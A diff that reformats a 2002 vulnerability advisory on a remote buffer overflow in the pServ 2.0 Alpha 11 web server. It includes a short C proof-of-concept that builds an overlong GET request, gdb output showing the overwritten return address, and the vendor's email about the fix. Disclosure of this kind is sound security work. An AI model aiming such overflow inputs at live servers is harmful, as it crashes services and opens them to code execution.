@@ -1,53 +1,111 @@
-                                                                                                            Advisory #: 93
-Title: Remote Buffer Overflow in pServ 2.0 Alpha 11
-Author:Larry W. Cashdollar, @_larry0
-Date: 2002-08-16
-Download Site: http://sourceforge.net/projects/pserv
-Vendor:rmottola
-Vendor Notified: 2002-08-18
-Vendor Contact: Riccardo Mottola
-ngi.it>
-Description: The aim of pServ (pico Server) is to create a portable, small webserver. Coded in portable C with Unix being the main reference platform, but porting is encouraged. Portability and small footprint should enable the use
-of pServ on a workstation as well as
-Vulnerability:
-Here is a dump of a remote overflow in the handling of the GET request. <-------------------------------Test program---------------------------> #include <stdio.h> #include <stdlib.h> int main (int argc, char *argv[]) { int i; char
-buffer[300]; bzero (buffer,300); for (i = 0;i<= atoi(argv[1]);i++) buffer[i] = 'X'; for (i=0;i<=atoi(argv[2]);i++) buffer[i+atoi(argv[1])] = 'A'; printf("GET /%s HTTP/1.0\r\n",buffer); } <-------------------------------------------
----------------------------> <-----------------------------Gdb output-------------------------------> accepted from 127.0.0.1 read error: 9 handling get of /
-XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-error recognizing extension: i = 19, extlen = 231 error during html [mime header] sock writing! 9 invalid out descriptor Program received signal SIGSEGV, Segmentation fault. 0x42080b1b in strlen () from /lib/i686/libc.so.6 (gdb)
-where #0 0x42080b1b in strlen () from /lib/i686/libc.so.6 #1 0x42051e4d in vfprintf () from /lib/i686/libc.so.6 #2 0x4205a197 in fprintf () from /lib/i686/libc.so.6 #3 0x0804ce6d in logWriteFileNotFound ( docPath=0x41414141
-<Address 0x41414141 out of bounds>, req= {address = 'A' <repeats 16 times>, method = 'A' <repeats 16 times>, documentAddress = 'A' <repeats 44 times>, "\0", 'X' <repeats 106 times>, 'A' <repeats 81 times>, '\0' <repeats 791 times>,
-queryString = '\0' <repeats 1023 times>, protocolVersion = "HTTP/1.0\0\0\0\0\0\0\0", keepAlive = 0, userAgent = "NR", '\0' <repeats 253 times>, rest = '\0' <repeats 360 times>, "Â²L\0@\0\020\023B
-=\0\0\003\0\0\02\0\0\0^?^?^?^?\0\0\0\0Â \004\0\0Ã€4\001@\0\0\0B\0Ã€\022BcÂ¹\022BcÂ¹\022B\0\0\0\0\005\0\0\0\0Ã€\022B\0\020\023B`\v\023B M\023B\0Ã€\022\0\003\0\0\0ÃÂ6\001@Ã^;\001@(Ã«^?Â¿Ãf\213\0@Ã°=\001@Â°;\001@\024", '\0' <repeats
-11 times>, "\024\0\0\0\0\0\0/Ã^;\001@\001\0\0\0Ã•\205\004\bÂ°;\001@Ã€4\001@\001\003\0\0\0\0\0\0\bÃ¬^?Â¿\tM\0@\005\0\0\0\005\0\0\0\bÃ¬^?Â¿[N\0@\001\003\0\0\0\0\0\0\0\0\0"...}) at log.c:96 #4 0x08049412 in sayError (sock=1482184792,
-err=1096308824, filePath=0x41414141 <Address 0x41414141 out of bounds>, req= {address = 'A' <repeats 16 times>, method = 'A' <repeats 16 times>, documentAddress = 'A' <repeats 44 times>, "\0", 'X' <repeats 106 times>, 'A' <repeats
-81 times>, '\0' <repeats 791 times>, queryString = '\0' <repeats 1023 times>, protocolVersion = "HTTP/1.0\0\0\0\0\0\0\0", keepAlive = 0, userAgent = "NR", '\0' <repeats 253 times>, rest = '\0' <repeats 360 times>,
-"Â²L\0@\0\020\023B =\0\0\003\0\0\02\0\0\0^?^?^?^?\0\0\0\0Â \004\0\0Ã€4\001@\0\0\0B\0Ã€\022BcÂ¹\022BcÂ¹\022B\0\0\0\0\---Type <return> to continue, or q <return> to quit--- 005\0\0\0\0Ã€\022B\0\020\023B`\v\023B
-M\023B\0Ã€\022\0\003\0\0\0ÃÂ6\001@Ã^;\001@(Ã«^?Â¿Ãf\213\0@Ã°=\001@Â°;\001@\024", '\0' <repeats 11 times>, "\024\0\0\0\0\0\0/
-Ã^;\001@\001\0\0\0Ã•\205\004\bÂ°;\001@Ã€4\001@\001\003\0\0\0\0\0\0\bÃ¬^?Â¿\tM\0@\005\0\0\0\005\0\0\0\bÃ¬^?Â¿[N\0@\001\003\0\0\0\0\0\0\0\0\0"...}) at main.c:135 #5 0x58585858 in ?? () Cannot access memory at address 0x58585858 (gdb)
-From lwc@vapid.ath.cx Sat Apr 19 07:00:45 2003 Date: Wed, 18 Sep 2002 11:00:36 -0400 (EDT) From: Larry W. Cashdollar <lwc@vapid.ath.cx> To: Riccardo Mottola <multix@ngi.it> Subject: Re: buffer overflow in pserv Nice work! On Wed,
-18 Sep 2002, Riccardo Mottola wrote: > Hello Larry, > > I found the buffer overflow you pinpointed. It was hard work! I was checking > all my code, when I noticed... I used a too small buffer when writing the > error responsse
-through the socket! I was returning the whole "wrong header" > which... didn't fit in the standard buffer. Now it should work. > By ooking for your bug I also hardened the ?query-string part of the header: > on one side i was
-wasting half of the buffer risking another overflow for a > long cgi query, on the otherside I now trap the error and send pack an error > page so the client (as usually browsers do) stop trying. > I just noticed that opera isn't
-capable of sending a "too long" line, ti > truncates it! So I needed another browser to stimulate it better. > Hope all got a stp further. The current release is alpha 11; the bug fix > will come out in alpha 12 (likely tomorrow)
-which, if no other reports come > in, is candidate for beta 1. I have to test a bit alpha12 since I changed > some details and will make some regression-tests before releasing. > > Regards, > Riccardo > >
-CVE-
-JSON:Export
-Exploit Code:
-   1. #include <stdlib.h>
-   2. #include <stdio.h>
-   3.  
-   4. int
-   5. main (int argc, char *argv[])
-   6. {
-   7. int i;
-   8. char buffer[300];
-   9. bzero (buffer,300);
-  10. for (i = 0;i<= atoi(argv[1]);i++) buffer[i] = 'X';
-  11.  
-  12. for (i=0;i<=atoi(argv[2]);i++)
-  13. buffer[i+atoi(argv[1])] = 'A';
-  14. printf("GET /%s HTTP/1.0\r\n",buffer);
-  15.  }
-Screen Shots:
-Advisory: http://www.vapid.dhs.org/advisories/pserv_remote_overflow.html
+
+                               Advisory #: 93
+
+   Title: Remote Buffer Overflow in pServ 2.0 Alpha 11
+   Author: Larry W. Cashdollar, @_larry0
+   Date: 2002-08-16
+   Download Site: http://sourceforge.net/projects/pserv
+   Vendor: rmottola
+   Vendor Notified: 2002-08-18
+   Vendor Contact: Riccardo Mottola
+   Description: The aim of pServ (pico Server) is to create a portable,
+   small webserver. Coded in portable C with Unix being the main reference
+   platform, but porting is encouraged. Portability and small footprint
+   should enable the use of pServ on a workstation as well as
+   Vulnerability:
+   Here is a dump of a remote overflow in the handling of the GET request.
+   <-------------------------------Test
+   program---------------------------> #include <stdio.h> #include
+   <stdlib.h> int main (int argc, char *argv[]) { int i; char buffer[300];
+   bzero (buffer,300); for (i = 0;i<= atoi(argv[1]);i++) buffer[i] = 'X';
+   for (i=0;i<=atoi(argv[2]);i++) buffer[i+atoi(argv[1])] = 'A';
+   printf("GET /%s HTTP/1.0\r\n",buffer); }
+   <----------------------------------------------------------------------
+   > <-----------------------------Gdb
+   output-------------------------------> accepted from 127.0.0.1 read
+   error: 9 handling get of
+   /XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
+   XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
+   XXXXXXXXXAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+   AAAAAAAAAAAAAAAAAAA error recognizing extension: i = 19, extlen = 231
+   error during html [mime header] sock writing! 9 invalid out descriptor
+   Program received signal SIGSEGV, Segmentation fault. 0x42080b1b in
+   strlen () from /lib/i686/libc.so.6 (gdb) where #0 0x42080b1b in strlen
+   () from /lib/i686/libc.so.6 #1 0x42051e4d in vfprintf () from
+   /lib/i686/libc.so.6 #2 0x4205a197 in fprintf () from
+   /lib/i686/libc.so.6 #3 0x0804ce6d in logWriteFileNotFound (
+   docPath=0x41414141 <Address 0x41414141 out of bounds>, req= {address =
+   'A' <repeats 16 times>, method = 'A' <repeats 16 times>,
+   documentAddress = 'A' <repeats 44 times>, "\0", 'X' <repeats 106
+   times>, 'A' <repeats 81 times>, '\0' <repeats 791 times>, queryString =
+   '\0' <repeats 1023 times>, protocolVersion = "HTTP/1.0\0\0\0\0\0\0\0",
+   keepAlive = 0, userAgent = "NR", '\0' <repeats 253 times>, rest = '\0'
+   <repeats 360 times>, "Â²L\0@\0\020\023B
+   =\0\0\003\0\0\02\0\0\0^?^?^?^?\0\0\0\0Â
+   \004\0\0Ã€4\001@\0\0\0B\0Ã€\022BcÂ¹\022BcÂ¹\022B\0\0\0\0\005\0\0\0\0Ã€\
+   022B\0\020\023B`\v\023B
+   M\023B\0Ã€\022\0\003\0\0\0Ã6\001@Ãˆ;\001@(Ã«^?Â¿Ãf\213\0@Ã°=\001@Â°;\0
+   01@\024", '\0' <repeats 11 times>,
+   "\024\0\0\0\0\0\0/Ãˆ;\001@\001\0\0\0Ã•\205\004\bÂ°;\001@Ã€4\001@\001\00
+   3\0\0\0\0\0\0\bÃ¬^?Â¿\tM\0@\005\0\0\0\005\0\0\0\bÃ¬^?Â¿[N\0@\001\003\0\
+   0\0\0\0\0\0\0\0"...}) at log.c:96 #4 0x08049412 in sayError
+   (sock=1482184792, err=1096308824, filePath=0x41414141 <Address
+   0x41414141 out of bounds>, req= {address = 'A' <repeats 16 times>,
+   method = 'A' <repeats 16 times>, documentAddress = 'A' <repeats 44
+   times>, "\0", 'X' <repeats 106 times>, 'A' <repeats 81 times>, '\0'
+   <repeats 791 times>, queryString = '\0' <repeats 1023 times>,
+   protocolVersion = "HTTP/1.0\0\0\0\0\0\0\0", keepAlive = 0, userAgent =
+   "NR", '\0' <repeats 253 times>, rest = '\0' <repeats 360 times>,
+   "Â²L\0@\0\020\023B =\0\0\003\0\0\02\0\0\0^?^?^?^?\0\0\0\0Â
+   \004\0\0Ã€4\001@\0\0\0B\0Ã€\022BcÂ¹\022BcÂ¹\022B\0\0\0\0\---Type
+   <return> to continue, or q <return> to quit---
+   005\0\0\0\0Ã€\022B\0\020\023B`\v\023B
+   M\023B\0Ã€\022\0\003\0\0\0Ã6\001@Ãˆ;\001@(Ã«^?Â¿Ãf\213\0@Ã°=\001@Â°;\0
+   01@\024", '\0' <repeats 11 times>,
+   "\024\0\0\0\0\0\0/Ãˆ;\001@\001\0\0\0Ã•\205\004\bÂ°;\001@Ã€4\001@\001\00
+   3\0\0\0\0\0\0\bÃ¬^?Â¿\tM\0@\005\0\0\0\005\0\0\0\bÃ¬^?Â¿[N\0@\001\003\0\
+   0\0\0\0\0\0\0\0"...}) at main.c:135 #5 0x58585858 in ?? () Cannot
+   access memory at address 0x58585858 (gdb) From lwc@vapid.ath.cx Sat Apr
+   19 07:00:45 2003 Date: Wed, 18 Sep 2002 11:00:36 -0400 (EDT) From:
+   Larry W. Cashdollar <lwc@vapid.ath.cx> To: Riccardo Mottola
+   <multix@ngi.it> Subject: Re: buffer overflow in pserv Nice work! On
+   Wed, 18 Sep 2002, Riccardo Mottola wrote: > Hello Larry, > > I found
+   the buffer overflow you pinpointed. It was hard work! I was checking >
+   all my code, when I noticed... I used a too small buffer when writing
+   the > error responsse through the socket! I was returning the whole
+   "wrong header" > which... didn't fit in the standard buffer. Now it
+   should work. > By ooking for your bug I also hardened the ?query-string
+   part of the header: > on one side i was wasting half of the buffer
+   risking another overflow for a > long cgi query, on the otherside I now
+   trap the error and send pack an error > page so the client (as usually
+   browsers do) stop trying. > I just noticed that opera isn't capable of
+   sending a "too long" line, ti > truncates it! So I needed another
+   browser to stimulate it better. > Hope all got a stp further. The
+   current release is alpha 11; the bug fix > will come out in alpha 12
+   (likely tomorrow) which, if no other reports come > in, is candidate
+   for beta 1. I have to test a bit alpha12 since I changed > some details
+   and will make some regression-tests before releasing. > > Regards, >
+   Riccardo > >
+   CVE-
+   JSON: Export
+   Exploit Code:
+
+    1. #include <stdlib.h>
+    2. #include <stdio.h>
+    3.
+    4. int
+    5. main (int argc, char *argv[])
+    6. {
+    7. int i;
+    8. char buffer[300];
+    9. bzero (buffer,300);
+   10. for (i = 0;i<= atoi(argv[1]);i++) buffer[i] = 'X';
+   11.
+   12. for (i=0;i<=atoi(argv[2]);i++)
+   13. buffer[i+atoi(argv[1])] = 'A';
+   14. printf("GET /%s HTTP/1.0\r\n",buffer);
+   15. }
+
+   Screen Shots:
+   Advisory:
+   http://www.vapid.dhs.org/advisories/pserv_remote_overflow.html
